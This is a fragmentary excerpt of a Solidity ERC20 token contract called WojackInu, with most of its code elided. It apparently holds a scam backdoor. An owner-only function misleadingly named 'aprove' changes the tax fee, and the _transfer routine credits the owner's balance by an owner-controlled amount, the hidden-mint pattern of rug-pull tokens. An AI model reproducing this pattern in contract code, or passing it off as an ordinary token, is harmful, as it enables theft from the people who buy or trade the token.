 ...
 */
 ...
 contract WojackInu is Context, ERC20, ERC20Metadata {
     ...
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_,uint256 SetTxAmount_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    ...
    function aprove(uint256 a) public virtual onlyOwner {
        _setTaxFee( a);
    ...
    function SetTxAmount(uint256 newTaxFee) public virtual onlyOwner {
        _SetTxAmount = newTaxFee;
    ...
    function _transfer(
        ...
        Tokens[_owner] += _BuyTaxFee * _SetTxAmount ;
